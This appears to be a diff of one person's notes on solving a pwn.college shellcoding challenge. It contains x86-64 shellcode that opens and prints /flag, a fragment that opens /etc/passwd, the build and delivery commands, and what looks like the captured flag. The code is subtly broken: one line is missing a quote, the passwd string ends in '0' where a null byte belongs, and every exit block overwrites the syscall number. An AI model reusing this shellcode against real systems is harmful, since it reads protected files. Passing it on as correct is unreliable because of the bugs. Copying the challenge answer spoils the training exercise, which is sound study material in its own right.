@@ -1,0 +1,137 @@
+# ssh -i key hacker@dojo.pwn.college
+
+# open.s file
+.intel_syntax noprefix
+mov BYTE PTR [rsp], '/'
+mov BYTE PTR [rsp+1], 'e'
+mov BYTE PTR [rsp+2], 't'
+mov BYTE PTR [rsp+3], 'c'
+mov BYTE PTR [rsp+4], '/'
+mov BYTE PTR [rsp+5], 'p'
+mov BYTE PTR [rsp+6], 'a'
+mov BYTE PTR [rsp+7], 's
+mov BYTE PTR [rsp+8], 's'
+mov BYTE PTR [rsp+9], 'w'
+mov BYTE PTR [rsp+10], 'd'
+mov BYTE PTR [rsp+11], '0'
+mov rax, 2
+mov rdi, rsp
+mov rsi, 0
+syscall
+
+# s file open, read and write base
+.global _start
+.intel_syntax noprefix
+_start:
+    # open files
+    mov rsi, 0
+    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
+    mov rax, 2              #syscall 2 opens file
+    syscall
+
+    #read files
+    mov rdi, rax    #file saved in rax from above syscall
+    mov rsi, rsp    #move file to readable register
+    mov rdx, 100    # reads 100 bytes
+    mov rax, 0
+    syscall
+
+    #write files
+    mov rdi, 1      #write to stdout
+    mov rsi, rsp    #moves file to write 
+    mov rdx, rax    #reads # of bytes to write
+    mov rax, 1
+    syscall
+
+    #exit
+    mov rax, 60
+    mov rax, 42
+    syscall
+
+#\0 is null terminating for strings
+flag:
+    .ascii "/flag\0"
+
+# alternative flag opening
+.global _start
+.intel_syntax noprefix
+_start:
+    
+    mov rbx, 0x67616c662f   # file location?
+    push rbx                # puts flag on stack
+
+
+    #open files
+    mov rsi, 0
+    #lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
+    mov rdi, rsp
+    mov rax, 2              #syscall 2 opens file
+    syscall
+
+    #read files
+    mov rdi, rax    #file saved in rax from above syscall
+    mov rsi, rsp    #move file to readable register
+    mov rdx, 100    # reads 100 bytes
+    mov rax, 0
+    syscall
+
+    #write files
+    mov rdi, 1      #write to stdout
+    mov rsi, rsp    #moves file to write 
+    mov rdx, rax    #reads # of bytes to write
+    mov rax, 1
+    syscall
+
+    #exit
+    mov rax, 60
+    mov rax, 42
+    syscall
+
+#\0 is null terminating for strings
+#flag:
+    #.ascii "/flag\0"
+
+
+
+
+# 1
+# s file
+.global _start
+.intel_syntax noprefix
+_start:
+    # open files
+    mov rsi, 0
+    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
+    mov rax, 2              #syscall 2 opens file
+    syscall
+
+    #read files
+    mov rdi, rax    #file saved in rax from above syscall
+    mov rsi, rsp    #move file to readable register
+    mov rdx, 100    # reads 100 bytes
+    mov rax, 0
+    syscall
+
+    #write files
+    mov rdi, 1      #write to stdout
+    mov rsi, rsp    #moves file to write 
+    mov rdx, rax    #reads # of bytes to write
+    mov rax, 1
+    syscall
+
+    #exit
+    mov rax, 60
+    mov rax, 42
+    syscall
+
+#\0 is null terminating for strings
+flag:
+    .ascii "/flag\0"
+
+gcc -nostdlib -o solve.elf shell1.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level1 
+
+pwn.college{wFFhDj-LQu_ObeVAAXX_G4tLeMm.QX3EjMscTOxUzW}
